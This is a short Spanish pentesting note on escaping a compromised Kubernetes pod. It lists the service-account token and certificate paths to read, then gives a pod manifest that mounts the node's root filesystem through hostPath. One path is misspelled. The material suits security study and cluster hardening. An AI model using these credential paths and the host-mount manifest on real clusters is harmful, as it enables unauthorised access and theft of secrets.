[[Apuntes]]

Si has accedido a un pod puedes sacar información para saltar al cluster, obtener tokens y archivos de configuración, a continuación muestro que rutas son:

- /`run/secrets/kubernetes.io/serviceccount`

- `/var/run/secrets/kubernetes.io/serviceaccount`

- `/secrets/kubernetes.io/serviceaccount`


Puede contener los siguientes archivos:

- **ca.crt**: Es el certificado que comprueba la comunicación con el kubernetes

- namespace: Indica el namespace actual

- token: contiene el servicio token del pod actual


Si fuera el caso de que hemos obtenido información suficiente en estos archivos podemos crear un pod y hacer que la raiz (/) de la máquina que queremos acceder se monte dentro de un pod en /mnt y así tener acceso a todos los archivos de el servidor kubernetes.


```
apiVersion: v1
kind: Pod
metadata:
  name: j4ckie-pod
  namespace: default
spec:
  containers:
  - name: j4ckie-pod
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
```

En hacktrickz tiene una cheat sheet genial que nos puede servir de ayuda -->
[Kubernetes EnumerationHackTricks Cloud](https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/kubernetes-enumeration)